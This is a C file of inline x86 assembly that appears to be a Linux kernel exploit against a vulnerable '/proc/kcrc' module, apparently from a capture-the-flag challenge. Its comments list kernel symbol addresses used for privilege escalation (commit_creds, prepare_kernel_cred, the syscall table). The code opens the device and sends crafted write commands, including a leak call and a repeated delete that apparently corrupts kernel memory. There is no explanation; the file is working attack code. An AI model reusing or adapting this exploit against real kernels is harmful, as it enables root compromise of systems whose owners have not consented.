#include <stdint.h>

// syscall_table        0xc15fa020
// sys_unlink           0xc15fa04c
// sys_time             0xc15fa058
// sys_execve           0xc1160130
// commit_creds         0xc1071d20
// prepare_kernel_cred  0xc10720e0

int32_t _start() {
    asm(".intel_syntax noprefix");
    asm("call start");
    asm(".ascii \"/proc/kcrc\\0\"");

    asm("delete:");
    asm("push 0xde1");
    asm("mov ecx, esp");
    asm("mov edx, 0xc");
    asm("mov eax, 4");
    asm("int 0x80");
    asm("pop ecx");
    asm("ret");

    asm("leak:");
    asm("push 0x4");
    asm("push edi");
    asm("push 0xadd");
    asm("mov ecx, esp");
    asm("mov edx, 0xc");
    asm("mov eax, 4");
    asm("int 0x80");
    asm("add esp, 0xc");
    asm("ret");

    asm("open:");
    asm("mov ebx, esi");
    asm("mov ecx, 2");
    asm("mov eax, 5");
    asm("int 0x80");
    asm("ret");

    asm("close:");
    asm("mov eax, 6");
    asm("int 0x80");
    asm("ret");

    asm("write:");
    asm("push edi");
    asm("mov ecx, esp");
    asm("push esi");
    asm("push ecx");
    asm("push 0xadd");
    asm("mov ecx, esp");
    asm("mov edx, 0xc");
    asm("mov eax, 4");
    asm("int 0x80");
    asm("add esp, 0x10");
    asm("ret");

    asm("read:");
    asm("mov edx, 4");
    asm("mov ecx, edi");
    asm("mov eax, 3");
    asm("int 0x80");
    asm("ret");

    asm("main:");
    asm("call open");
    asm("xchg eax, ebx");
    
    asm("mov esi, 4");
    asm("mov edi, 0xc8811580");
    asm("call leak");
    
    asm("call delete");
    asm("call delete");
    asm("call close");
    
    asm("exit:");
    asm("mov eax, 1");
    asm("int 0x80");

    asm("start:");
    asm("pop esi");
    asm("sub esp, 0x200");
    asm("call main");
    asm(".att_syntax prefix");
}
